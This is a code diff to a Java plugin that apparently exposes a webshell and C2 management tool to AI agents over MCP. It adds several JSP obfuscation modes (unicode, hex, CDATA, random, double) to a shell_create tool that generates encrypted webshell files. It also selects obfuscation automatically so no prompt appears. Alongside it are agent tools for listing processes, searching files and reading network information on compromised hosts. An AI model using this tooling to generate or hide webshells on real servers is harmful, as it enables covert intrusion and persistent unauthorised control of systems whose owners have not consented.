@@ -1385,7 +1385,7 @@ public class McpService implements Plugin {
         sb.append(",").append(t("shell_search","\u641c\u7d22 Shell", p("keyword",s("\u5173\u952e\u8bcd"))));
         sb.append(",").append(t("shell_clone","\u514b\u9686 Shell", p("shellId",s("\u5fc5\u586b"),"newUrl",s("\u53ef\u9009"))));
         sb.append(",").append(t("shell_batch_test","\u6279\u91cf\u6d4b\u8bd5\u8fde\u63a5", p("group",s("\u53ef\u9009"))));
-        sb.append(",").append(t("shell_create","\u76f4\u63a5\u751f\u6210WebShell\u6587\u4ef6\u3002\u652f\u6301\u6a21\u7cca\u52a0\u5bc6\u5668\u540d(aesbase64/java_c2/gzip\u7b49\u81ea\u52a8\u8bc6\u522b),C2\u7c7b\u578b\u81ea\u52a8\u9009\u6a21\u677f,\u65e0\u9700payload_list/c2profile_list", p("url",s("\u9009\u586b"),"password",s("\u9009\u586b,\u9ed8\u8ba4pass"),"secretKey",s("\u9009\u586b,\u9ed8\u8ba4key"),"payload",s("\u9009\u586b,\u9ed8\u8ba4JavaDynamicPayload"),"cryption",s("\u5fc5\u586b,\u652f\u6301\u6a21\u7cca\u540d\u5982aesbase64/java_c2/gzip"),"genFile",s("\u5fc5\u586b,\u8f93\u51fa\u8def\u5f84"),"obfuscation",s("\u9009\u586b:none/default/superObfuscation"),"c2Profile",s("\u9009\u586b,C2\u7c7b\u578b\u81ea\u52a8\u9009\u7b2c\u4e00\u4e2a"))));
+        sb.append(",").append(t("shell_create","\u76f4\u63a5\u751f\u6210WebShell\u6587\u4ef6\u3002\u652f\u6301\u6a21\u7cca\u52a0\u5bc6\u5668\u540d(aesbase64/java_c2/gzip\u7b49\u81ea\u52a8\u8bc6\u522b),C2\u7c7b\u578b\u81ea\u52a8\u9009\u6a21\u677f,\u65e0\u9700payload_list/c2profile_list", p("url",s("\u9009\u586b"),"password",s("\u9009\u586b,\u9ed8\u8ba4pass"),"secretKey",s("\u9009\u586b,\u9ed8\u8ba4key"),"payload",s("\u9009\u586b,\u9ed8\u8ba4JavaDynamicPayload"),"cryption",s("\u5fc5\u586b,\u652f\u6301\u6a21\u7cca\u540d\u5982aesbase64/java_c2/gzip"),"genFile",s("\u5fc5\u586b,\u8f93\u51fa\u8def\u5f84"),"obfuscation",s("\u9009\u586b:none/default/superObfuscation/superUnicode/superHex/superXml/superRandom/superDouble"),"c2Profile",s("\u9009\u586b,C2\u7c7b\u578b\u81ea\u52a8\u9009\u7b2c\u4e00\u4e2a"))));
         sb.append(",").append(t("process_list","\u8fdb\u7a0b\u5217\u8868", p("shellId",s("\u5fc5\u586b"))));
         sb.append(",").append(t("file_search","\u641c\u7d22\u6587\u4ef6", p("shellId",s("\u5fc5\u586b"),"pattern",s("\u5fc5\u586b"),"path",s("\u53ef\u9009"))));
         sb.append(",").append(t("net_info","\u7f51\u7edc\u4fe1\u606f", p("shellId",s("\u5fc5\u586b"))));
@@ -2398,6 +2398,31 @@ public class McpService implements Plugin {
             for (String cn : ApplicationContext.getAllCryption(payload)) avail.append("  ").append(cn).append("\n");
             return avail.toString();
         }
+        // MCP: programmatic processor selection - never pop ChooseProcessor/ChooseEscapes dialogs.
+        String obf = obfLevel == null ? "default" : obfLevel.toLowerCase();
+        if (obf.startsWith("super")) {
+            core.shellprocessor.StartProcessor.setAutoProcessor("JspEscapesProcessor");
+            core.shellprocessor.jspescapes.JspEscapesProcessor.EscapesOptions autoOpts =
+                    new core.shellprocessor.jspescapes.JspEscapesProcessor.EscapesOptions();
+            autoOpts.EncodingMethod = "关闭";
+            autoOpts.isEncodingHeader = true;
+            autoOpts.isAppendLitter = false;
+            autoOpts.isDoubleConfusion = false;
+            autoOpts.isRandomConfusion = false;
+            autoOpts.minLitterNumber = 2;
+            autoOpts.maxLitterNumber = 5;
+            // superObfuscation=十进制 | superUnicode=unicode 转义 | superHex=十六进制
+            // superXml=CDATA 逐字符 | superRandom=随机模式 | superDouble=双重混淆(先 unicode 再随机)
+            if (obf.equals("superunicode")) { autoOpts.escapeMethod = "escapesUnicode"; }
+            else if (obf.equals("superhex")) { autoOpts.escapeMethod = "escapesHex"; }
+            else if (obf.equals("superxml")) { autoOpts.escapeMethod = "escapesXmlLabel"; }
+            else if (obf.equals("superrandom")) { autoOpts.isRandomConfusion = true; }
+            else if (obf.equals("superdouble")) { autoOpts.isDoubleConfusion = true; autoOpts.isRandomConfusion = true; }
+            else { autoOpts.escapeMethod = "escapesDecimal"; }
+            core.shellprocessor.jspescapes.JspEscapesProcessor.setAutoOptions(autoOpts);
+        } else {
+            core.shellprocessor.StartProcessor.setAutoProcessor("none");
+        }
         // Build ShellEntity
         ShellEntity sh = new ShellEntity();
         sh.setId(UUID.randomUUID().toString());
@@ -2451,6 +2476,10 @@ public class McpService implements Plugin {
                 + " | URL: " + url + " | Payload: " + payload + " | Cryption: " + cryption
                 + " | Obfuscation: " + obfLevel + " | C2Profile: " + (c2Profile != null ? c2Profile : "\u65e0");
         } catch (Exception ex) { return "\u751f\u6210\u5931\u8d25: " + ex.getMessage(); }
+        finally {
+            core.shellprocessor.StartProcessor.clearAutoProcessor();
+            core.shellprocessor.jspescapes.JspEscapesProcessor.clearAutoOptions();
+        }
     }
 
     // --- Export/Import ---
